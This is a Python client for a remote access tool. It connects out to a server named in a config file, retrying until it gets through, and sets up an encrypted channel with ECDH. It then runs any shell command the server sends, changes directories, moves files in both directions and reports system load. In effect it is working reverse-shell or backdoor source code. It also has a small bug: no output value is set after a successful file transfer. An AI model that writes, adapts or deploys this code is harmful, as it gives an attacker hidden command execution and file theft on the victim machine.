import socket
import subprocess
import psutil 
import os
from DFH import Dfh_client as Dfh
from Client_mod import Client
import platform
from file_upload_download import FileManagerClientside as FileManagerClient
import json
from ecc_implement import ECDH
import sys

with open("client.json", "r") as f:
    client_data = json.load(f)

client_EC = ECDH()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = client_data["server_ip"]
PORT = client_data["port"]
while True:
    try:
        s.connect((HOST, PORT))
        break
    except Exception as e:
        pass
s.send(f"{client_EC.public_key.x}-{client_EC.public_key.y}".encode())
server_public_key = s.recv(1024).decode().split("-")
key = str(client_EC.generate_secret(int(server_public_key[0]), int(server_public_key[1])))
key = key[:16].encode()
# removed the secret key
client = Client(key, s)
client.send(platform.platform())

def shell():
    try:
        while True:
            command = client.recv()
            print(command)
            if command.startswith("cd"):
                try:
                    os.chdir(command.split(maxsplit=1)[1])
                    output = f"Changed to {os.getcwd()}"
                except Exception as e:
                    output = f"Error: {e}"
            elif command.lower() == "utils":
                output = ("####CPUM#### " + f"{psutil.cpu_percent(interval=1)}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}")
            elif command == "..SYN..":
                output = ""
            elif command.startswith("upload "):
                filename = command.split("upload ")[1]
                cf = FileManagerClient(client)
                try:
                    cf.download_from_server(filename)
                except:
                    output = "error while uploading the file" 
            elif command.startswith("download "):
                filename = command.split("download ")[1]
                cf = FileManagerClient(client)
                try:
                    cf.upload_to_server(filename)
                except:
                    output = "error while downloading the file" 
            elif command == "####TERMINATE####":     
                sys.exit(2)
                return None

            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Error executing command: {e}"
            
            client.send(output)
    except Exception as e:
        print(f"exception occured {e}") 

if __name__ == "__main__":
    shell()
